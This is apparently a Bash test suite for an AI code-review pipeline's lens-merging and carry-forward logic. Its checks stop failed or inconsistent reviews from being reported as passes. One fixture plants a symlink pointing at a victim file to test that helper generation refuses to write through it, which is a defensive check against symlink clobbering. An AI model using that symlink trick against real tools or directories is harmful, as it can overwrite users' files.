check_eq "a skipped lens result is schema-valid" \
  "must_fix,should_fix,summary,test_gaps,verdict" \
  "$(jq -r 'keys | join(",")' "$M/s.json")"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "a skipped lens still merges" "0" "$(cat "$M/out.status")"
SKIP_SUMMARY="$(jq -r '.summary' "$M/out.json")"
check_contains "the aggregate exposes the SKIPPED lens" "$SKIP_SUMMARY" "[lens states]"
check_contains "the aggregate names which lens was skipped" "$SKIP_SUMMARY" "security: SKIPPED"
check_contains "the aggregate says the other lens was fresh" "$SKIP_SUMMARY" "correctness: FRESH"
check_contains "the skipped lens carries its reason" "$SKIP_SUMMARY" "docs/media-only diff"

# A CARRIED-FORWARD lens, and the round it came from.
M="$ROOT/merge-carry"
mkdir -p "$M"
fresh_pass "Reviewed and clean." > "$M/c.json"; printf '0\n' > "$M/c.status"
fresh_pass "Nothing wrong." > "$M/s.json"; printf '0\n' > "$M/s.status"
"$WRITE" correctness carried "$M/c.json" "$M/c.status" 2 1 >/dev/null 2>&1
check_eq "write-lens-result carries a clean pass forward" "0" "$?"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "a carried lens still merges" "0" "$(cat "$M/out.status")"
CARRY_SUMMARY="$(jq -r '.summary' "$M/out.json")"
check_contains "the aggregate exposes the CARRIED lens" \
  "$CARRY_SUMMARY" "correctness: CARRIED FORWARD from round 1"
check_contains "the carried lens summary says so itself" \
  "$CARRY_SUMMARY" "CARRIED FORWARD from round 1 into round 2"

# Carrying twice must not build a chain of markers.
"$WRITE" correctness carried "$M/c.json" "$M/c.status" 3 2 >/dev/null 2>&1
CARRY_TWICE="$(jq -r '.summary' "$M/c.json")"
check_contains "a twice-carried lens names the latest hop" \
  "$CARRY_TWICE" "CARRIED FORWARD from round 2 into round 3: Reviewed and clean."
check_eq "a twice-carried lens does not chain markers" "1" \
  "$(grep -c -o 'CARRIED FORWARD' <<< "$CARRY_TWICE")"

# What must NOT be carryable.
M="$ROOT/merge-refuse"
mkdir -p "$M"
# Each of these carries a status of 0, so the refusal can only come from the
# RESULT check and not from the status check added alongside it.
printf '{"verdict":"must_fix","summary":"Found a bug.","must_fix":["[COR-001] boom"],"should_fix":[],"test_gaps":[]}\n' > "$M/c.json"
printf '0\n' > "$M/c.status"
"$WRITE" correctness carried "$M/c.json" "$M/c.status" 2 1 >/dev/null 2>&1
check_ne "a must_fix result cannot be carried forward" "0" "$?"
"$WRITE" security skipped "$M/s.json" "$M/s.status" 1 'docs only' >/dev/null 2>&1
"$WRITE" security carried "$M/s.json" "$M/s.status" 2 1 >/dev/null 2>&1
check_ne "a skipped lens cannot be carried forward" "0" "$?"
printf '{"verdict":"pass","summary":"ok"}\n' > "$M/m.json"
printf '0\n' > "$M/m.status"
"$WRITE" correctness carried "$M/m.json" "$M/m.status" 2 1 >/dev/null 2>&1
check_ne "a malformed result cannot be carried forward" "0" "$?"
rm -f "$M/gone.json"
"$WRITE" correctness carried "$M/gone.json" "$M/gone.status" 2 1 >/dev/null 2>&1
check_ne "a lens with no previous result cannot be carried forward" "0" "$?"

# A lens can emit pass-shaped JSON and still EXIT non-zero - the runner died
# after writing the result, the pane went away, the schema check failed
# downstream. Carrying that forward would turn a failed lens into a clean pass
# and let merge-reviews aggregate it as status 0, so the previous STATUS has to
# be checked as well as the previous result.
M="$ROOT/merge-status"
mkdir -p "$M"
for bad_status in 1 2 65 125 124 ok; do
  fresh_pass "Pass-shaped, but the run failed." > "$M/c.json"
  printf '%s\n' "$bad_status" > "$M/c.status"
  CARRY_OUT="$("$WRITE" correctness carried "$M/c.json" "$M/c.status" 2 1 2>&1)"
  check_ne "a previous status of [$bad_status] cannot be carried forward" "0" "$?"
  check_contains "refusing status [$bad_status] says why" \
    "$CARRY_OUT" "cannot be carried forward"
  check_absent "a refused carry does not stamp the result" \
    "$(cat "$M/c.json")" "CARRIED FORWARD"
  check_eq "a refused carry leaves the status file alone" \
    "$bad_status" "$(cat "$M/c.status")"
done

fresh_pass "Pass-shaped, but the run failed." > "$M/c.json"
rm -f "$M/c.status"
"$WRITE" correctness carried "$M/c.json" "$M/c.status" 2 1 >/dev/null 2>&1
check_ne "a missing previous status cannot be carried forward" "0" "$?"

# ...and a genuinely clean previous run still carries.
fresh_pass "Reviewed and clean." > "$M/c.json"
printf '0\n' > "$M/c.status"
"$WRITE" correctness carried "$M/c.json" "$M/c.status" 2 1 >/dev/null 2>&1
check_eq "a previous status of 0 still carries forward" "0" "$?"
check_contains "the carried result is stamped" \
  "$(cat "$M/c.json")" "CARRIED FORWARD from round 1 into round 2"

# Everything merge-reviews already refused, it must still refuse.
M="$ROOT/merge-missing"
mkdir -p "$M"
fresh_pass "Nothing wrong." > "$M/c.json"; printf '0\n' > "$M/c.status"
printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/missing.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_ne "a missing lens result fails the merge" "0" "$?"
check_eq "a missing lens result still produces a must_fix aggregate" \
  "must_fix" "$(jq -r '.verdict' "$M/out.json")"
check_ne "a missing lens result leaves a non-zero aggregate status" \
  "0" "$(cat "$M/out.status")"

M="$ROOT/merge-malformed"
mkdir -p "$M"
fresh_pass "Nothing wrong." > "$M/c.json"; printf '0\n' > "$M/c.status"
printf 'The change looks fine to me.\n' > "$M/s.json"; printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_ne "a prose lens result fails the merge" "0" "$?"
check_eq "a prose lens result still produces a must_fix aggregate" \
  "must_fix" "$(jq -r '.verdict' "$M/out.json")"
check_ne "a prose lens result leaves a non-zero aggregate status" \
  "0" "$(cat "$M/out.status")"

M="$ROOT/merge-extrakey"
mkdir -p "$M"
fresh_pass "Nothing wrong." > "$M/c.json"; printf '0\n' > "$M/c.status"
printf '{"verdict":"pass","summary":"ok","must_fix":[],"should_fix":[],"test_gaps":[],"skipped":true}\n' > "$M/s.json"
printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_ne "an off-schema extra key fails the merge" "0" "$?"
check_eq "an off-schema extra key still produces a must_fix aggregate" \
  "must_fix" "$(jq -r '.verdict' "$M/out.json")"

# A lens can write pass-shaped JSON and still EXIT non-zero. Reading only the
# two JSON verdicts published verdict "pass" for a lens run that never
# completed, and every reader keying off the JSON - the squad GUI included - saw
# a clean pass. The STATUS has to reach the verdict, not just the exit code.
M="$ROOT/merge-failed-lens"
mkdir -p "$M"
fresh_pass "No issues found." > "$M/c.json"; printf '2\n' > "$M/c.status"
fresh_pass "No issues found." > "$M/s.json"; printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "a pass-shaped result from a FAILED lens is not a pass" \
  "must_fix" "$(jq -r '.verdict' "$M/out.json")"
check_eq "the failed lens leaves a non-zero aggregate status" "2" "$(cat "$M/out.status")"
FAILED_FINDINGS="$(jq -r '.must_fix | join("\n")' "$M/out.json")"
check_contains "the failure is named in the findings" \
  "$FAILED_FINDINGS" "[correctness] LENS RUN FAILED with status 2"
check_contains "the finding says the lens reviewed nothing" \
  "$FAILED_FINDINGS" "reviewed nothing"
FAILED_SUMMARY="$(jq -r '.summary' "$M/out.json")"
check_contains "the summary opens with the failure" "$FAILED_SUMMARY" "[lens run FAILED]"
check_contains "the summary refuses to imply approval" \
  "$FAILED_SUMMARY" "NOT because it reviewed and approved anything"
check_eq "the aggregate still has exactly the five schema keys" \
  "must_fix,should_fix,summary,test_gaps,verdict" \
  "$(jq -r 'keys | join(",")' "$M/out.json")"

# Both lenses failing names both.
printf '9\n' > "$M/c.status"; printf '65\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out2.json" "$M/out2.status" >/dev/null 2>&1
BOTH_FAILED="$(jq -r '.must_fix | join("\n")' "$M/out2.json")"
check_contains "both failed lenses are named" "$BOTH_FAILED" "[correctness] LENS RUN FAILED with status 9"
check_contains "the second failed lens is named too" "$BOTH_FAILED" "[security] LENS RUN FAILED with status 65"
check_eq "two failed lenses still merge to must_fix" "must_fix" "$(jq -r '.verdict' "$M/out2.json")"

# A genuinely clean pair must be untouched by any of that.
printf '0\n' > "$M/c.status"; printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out3.json" "$M/out3.status" >/dev/null 2>&1
check_eq "two clean lenses still pass" "pass" "$(jq -r '.verdict' "$M/out3.json")"
check_eq "two clean lenses raise no findings" "0" "$(jq '.must_fix | length' "$M/out3.json")"
check_absent "two clean lenses get no failure banner" \
  "$(jq -r '.summary' "$M/out3.json")" "[lens run FAILED]"

# A lens result can be schema-SHAPED and still be internally inconsistent:
# verdict "pass" while the must_fix array carries a blocking finding. That used
# to merge into an aggregate whose top-level verdict said "pass" while its
# must_fix array held the finding - and the GUI reads that top-level verdict, so
# a blocking review read as a pass.
M="$ROOT/merge-inconsistent"
mkdir -p "$M"
printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-004] real issue"],"should_fix":[],"test_gaps":[]}\n' > "$M/c.json"
fresh_pass "No issues found." > "$M/s.json"
printf '0\n' > "$M/c.status"; printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_ne "a pass carrying must_fix findings fails the merge" "0" "$?"
check_ne "a pass carrying must_fix findings is NOT published as a pass" \
  "pass" "$(jq -r '.verdict' "$M/out.json")"
check_ne "a pass carrying must_fix findings leaves a non-zero status" \
  "0" "$(cat "$M/out.status")"
check_contains "check_result names the inconsistency" \
  "$("$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/o2.json" "$M/o2.status" 2>&1)" \
  'says verdict "pass" but carries must_fix findings'

# The same on the security side, so the check is not one-sided.
fresh_pass "No issues found." > "$M/c.json"
printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-001] boundary"],"should_fix":[],"test_gaps":[]}\n' > "$M/s.json"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_ne "an inconsistent SECURITY result is caught too" \
  "pass" "$(jq -r '.verdict' "$M/out.json")"

# A lens being conservative - verdict must_fix with an empty array - already
# blocks, so it is deliberately tolerated rather than turned into a hard error.
printf '{"verdict":"must_fix","summary":"uneasy","must_fix":[],"should_fix":[],"test_gaps":[]}\n' > "$M/c.json"
fresh_pass "No issues found." > "$M/s.json"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "a conservative must_fix with no findings still merges" "0" "$?"
check_eq "and it still blocks" "must_fix" "$(jq -r '.verdict' "$M/out.json")"

# Whatever else changed, a genuinely clean pair must still be a pass.
fresh_pass "No issues found." > "$M/c.json"
fresh_pass "No issues found." > "$M/s.json"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "a genuinely clean pair is still a pass" "pass" "$(jq -r '.verdict' "$M/out.json")"
check_eq "a genuinely clean pair is still status 0" "0" "$(cat "$M/out.status")"

# The union and the lens tagging are untouched by all of the above.
M="$ROOT/merge-union"
mkdir -p "$M"
printf '{"verdict":"must_fix","summary":"one","must_fix":["[COR-001] a"],"should_fix":[],"test_gaps":["[TEST-001] t"]}\n' > "$M/c.json"
printf '2\n' > "$M/c.status"
printf '{"verdict":"pass","summary":"two","must_fix":[],"should_fix":["[SEC-003] b"],"test_gaps":[]}\n' > "$M/s.json"
printf '0\n' > "$M/s.status"
"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
check_eq "must_fix from either lens wins" "must_fix" "$(jq -r '.verdict' "$M/out.json")"
check_eq "a non-zero lens status reaches the aggregate" "2" "$(cat "$M/out.status")"
# The lens's own finding is still there and still tagged. It is no longer FIRST:
# this fixture's correctness status is 2, so the synthetic "LENS RUN FAILED"
# finding now leads, which is the point of that fix.
check_contains "findings stay tagged with the lens that raised them" \
  "$(jq -r '.must_fix | join("\n")' "$M/out.json")" "[correctness] [COR-001] a"
check_eq "should_fix is unioned across lenses" \
  "[security] [SEC-003] b" "$(jq -r '.should_fix[0]' "$M/out.json")"

echo ""

# =================================================================== squad-herdr ==
#
# squad-herdr carries a near-copy of this review flow and the two are meant not
# to diverge. These are the same invariants, checked against its own generated
# surface - deliberately thin, because squad-herdr's full behaviour is not this
# suite's subject.
echo "squad-herdr (the same four levers, ported)"

HERDR="$(dirname "$SQUAD")/squad-herdr"
if [[ ! -f "$HERDR" ]]; then
  no "squad-herdr exists next to squad" "not found: $HERDR"
else
  HGEN="$ROOT/gen-herdr"
  "$HERDR" gen-helpers "$HGEN" >/dev/null 2>&1
  check_eq "squad-herdr gen-helpers succeeds" "0" "$?"
  check_file "squad-herdr generates the correctness checklist" "$HGEN/checklist.correctness.md"
  check_file "squad-herdr generates the security checklist" "$HGEN/checklist.security.md"
  check_file "squad-herdr generates the diff classifier" "$HGEN/classify-diff"

  # Every classifier and delta assertion in this suite runs against SQUAD's
  # generated helper. squad-herdr keeps byte-identical copies of the three
  # shared helpers, and that is the only thing making those assertions speak for
  # it too - so a regression landing in one script and not the other is caught
  # here rather than silently going unreviewed on the herdr side.
  for shared in classify-diff capture-review-baseline write-lens-result; do
    if diff -q "$GEN/$shared" "$HGEN/$shared" >/dev/null 2>&1; then
      ok "squad and squad-herdr generate an identical $shared"
    else
      no "squad and squad-herdr generate an identical $shared" \
        "the two copies have diverged; the assertions above cover only squad's"
    fi
  done
  check_file "squad-herdr generates the lens-result writer" "$HGEN/write-lens-result"

  HPROMPT="$(cat "$HGEN/manager-prompt.md")"
  check_absent "squad-herdr no longer commands pasting the checklist" \
    "$HPROMPT" "Paste its contents"
  check_absent "squad-herdr no longer commands running both lenses every round" \
    "$HPROMPT" "ALWAYS run BOTH lenses"
  check_contains "squad-herdr keeps round 1 on the full diff" \
    "$HPROMPT" "Round 1 reviews the FULL uncommitted diff."
  check_contains "squad-herdr states the round-2+ delta rule" \
    "$HPROMPT" "Round 2 and later review only what"
  check_contains "squad-herdr falls back to full on any delta failure" \
    "$HPROMPT" "EVERY failure around the delta falls back to the FULL diff"
  check_contains "squad-herdr keeps the skip decision on the full change" \
    "$HPROMPT" "always computed on the FULL change, never on the"
  check_contains "squad-herdr states the skip rule sentence" "$HPROMPT" "$RULE"
  check_contains "squad-herdr states the carry-forward rule" \
    "$HPROMPT" "Carry-forward is the narrow exception,"
  check_contains "squad-herdr states lens independence as absolute" \
    "$HPROMPT" "LENS INDEPENDENCE IS ABSOLUTE"
  check_contains "squad-herdr states the round cap" \
    "$HPROMPT" "There is a HARD cap of 3 review rounds"
  # squad-herdr has no await-po helper - there is no tmux window name to badge -
  # so the cap tells the Manager to report to PO directly instead of marking.
  check_contains "squad-herdr reports to PO at the cap instead of marking" \
    "$HPROMPT" "Report the outstanding findings,"
  check_contains "squad-herdr references the per-lens checklist by path" \
    "$HPROMPT" "must name $HGEN/checklist.security.md as a file Advisor MUST"

  hmerged="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$HGEN/checklist.merged.md" | sort -u)"
  hcorrectness="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$HGEN/checklist.correctness.md")"
  hsecurity="$(sed -n 's/^- \[\([A-Z][A-Z0-9_-]*\)\].*/\1/p' "$HGEN/checklist.security.md")"
  hmissing=""
  for id in $hmerged; do
    if [[ "$hcorrectness" != *"$id"* && "$hsecurity" != *"$id"* ]]; then
      hmissing="$hmissing $id"
    fi
  done
  check_eq "squad-herdr loses no checklist ID in the split" "" "$hmissing"

  # squad-herdr keeps its OWN copy of merge-reviews - it is a documented port,
  # not a byte-identical file - so the status-forces-must_fix fix has to be
  # asserted against that copy separately.
  HM="$ROOT/herdr-merge"
  mkdir -p "$HM"
  fresh_pass "No issues found." > "$HM/c.json"; printf '2\n' > "$HM/c.status"
  fresh_pass "No issues found." > "$HM/s.json"; printf '0\n' > "$HM/s.status"
  "$HGEN/merge-reviews" "$HM/c.json" "$HM/c.status" "$HM/s.json" "$HM/s.status" \
    "$HM/out.json" "$HM/out.status" >/dev/null 2>&1
  check_eq "squad-herdr also refuses a pass for a failed lens" \
    "must_fix" "$(jq -r '.verdict' "$HM/out.json")"
  check_contains "squad-herdr names the failed lens too" \
    "$(jq -r '.must_fix | join("\n")' "$HM/out.json")" "[correctness] LENS RUN FAILED with status 2"

  # squad-herdr's merge-reviews is a separate port, so the pass-carrying-
  # must_fix fix has to be asserted against that copy too.
  printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-004] real issue"],"should_fix":[],"test_gaps":[]}\n' > "$HM/c.json"
  fresh_pass "No issues found." > "$HM/s.json"
  printf '0\n' > "$HM/c.status"; printf '0\n' > "$HM/s.status"
  "$HGEN/merge-reviews" "$HM/c.json" "$HM/c.status" "$HM/s.json" "$HM/s.status" \
    "$HM/inc.json" "$HM/inc.status" >/dev/null 2>&1
  check_ne "squad-herdr refuses a pass carrying must_fix findings" \
    "pass" "$(jq -r '.verdict' "$HM/inc.json")"
  check_ne "squad-herdr leaves a non-zero status for it" "0" "$(cat "$HM/inc.status")"

  HVICTIM="$ROOT/herdr-victim.txt"
  printf 'PRECIOUS\n' > "$HVICTIM"
  HHOSTILE="$ROOT/herdr-hostile"
  mkdir -p "$HHOSTILE"
  ln -s "$HVICTIM" "$HHOSTILE/run-coder"
  "$HERDR" gen-helpers "$HHOSTILE" >/dev/null 2>&1
  check_ne "squad-herdr refuses a directory with a pre-existing symlink" "0" "$?"
  check_eq "squad-herdr leaves the symlink target untouched" "PRECIOUS" "$(cat "$HVICTIM")"

  HBAD_OUT="$(SQUAD_REVIEW_MAX_ROUNDS=0 "$HERDR" gen-helpers "$ROOT/gen-herdr-bad" 2>&1)"
  check_eq "squad-herdr rejects a non-positive round cap" "1" "$?"
  check_contains "squad-herdr says why it rejected the round cap" \
    "$HBAD_OUT" "Error: SQUAD_REVIEW_MAX_ROUNDS must be a positive integer."
fi

echo ""

check_absent "nothing in this suite ever killed a window" "$(cat "$TMUX_STUB_LOG")" "kill-window"
check_absent "nothing in this suite ever killed a session" "$(cat "$TMUX_STUB_LOG")" "kill-session"
check_absent "nothing in this suite ever killed a server" "$(cat "$TMUX_STUB_LOG")" "kill-server"

echo ""
printf 'passed %d, failed %d\n' "$PASS" "$FAIL"
[[ "$FAIL" -eq 0 ]]
